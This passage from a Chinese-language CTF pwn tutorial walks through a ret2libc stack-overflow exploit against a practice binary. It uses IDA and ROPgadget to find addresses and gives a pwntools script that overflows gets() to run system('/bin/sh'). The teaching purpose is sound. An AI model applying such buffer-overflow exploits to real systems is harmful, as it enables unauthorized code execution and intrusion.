## 第三关

这一关中，我们主要通过导入函数里面的 `system("/bin/sh")` 函数来完成调用。

[Pwn3](<https://bbs.kanxue.com/elink@d26K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4y4%4L8%4u0V1i4K6u0r3M7s2N6F1i4K6g2X3k6i4S2W2j5%4u0A6M7$3g2Q4x3V1k6J5j5i4N6Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6H3N6$3&6Q4y4h3k6T1j5i4y4A6j5#2)9#2k6Y4u0G2M7q4)9J5c8Y4m8%4L8U0x3>).

![](https://bbs.kanxue.com/upload/attach/202002/93_9HHRXJ4VZTXJS5K.png)

发现它的保护也是类似的。该程序与之前类似，都是在 `gets` 函数存在漏洞。

首先查找 `system` 函数是否存在，利用 IDA 查看。

查看导入函数表，发现有 `system` 的外部调用函数在列表里面。

![](https://bbs.kanxue.com/upload/attach/202002/93_ZCACAH5KSKQ3F7B.png)

![](https://bbs.kanxue.com/upload/attach/202002/93_PEGDHKZKST373HD.png)

![](https://bbs.kanxue.com/upload/attach/202002/93_RUNZ483QQ3Z67CZ.png)

从而确定地址为 `0x08048460`。

在利用下面的命令查找 `"/bin/sh"` 的字符串，确定了字符串的地址为 `0x08048720`：

```
ROPgadget --binary ret2libc1 --string "/bin/sh"
```

![](https://bbs.kanxue.com/upload/attach/202002/93_RMN73BADD67C76Z.png)

那么就可以依葫芦画瓢的构造 shellcode 了。

```
#!/usr/bin/env python

from pwn import *

sh = process('./ret2libc1')

system_plt = 0x08048460
sh_addr = 0x8048720

payload = flat(['a' * 112, system_plt, 0xabcdabcd, sh_addr])

sh.sendline(payload)

sh.interactive()
```

这里解释一下，为什么会有 4 个字节空余的部分。

这里的部分，在正常调用 `system` 函数的时候，堆栈位置的 `system_plt` 之后的内容为 `system` 函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在 `system_plt` 和 `sh_addr` 之间增加了 4 个字符来进行填充。

![](https://bbs.kanxue.com/upload/attach/202002/93_F3ECSYVKCMAFCF7.png)

练习题：[pwn4](<https://bbs.kanxue.com/elink@6cdK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4y4%4L8%4u0V1i4K6u0r3M7s2N6F1i4K6g2X3k6i4S2W2j5%4u0A6M7$3g2Q4x3V1k6J5j5i4N6Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6H3N6$3&6Q4y4h3k6T1j5i4y4A6j5#2)9#2k6Y4u0G2M7q4)9J5c8Y4m8%4L8U0b7>).
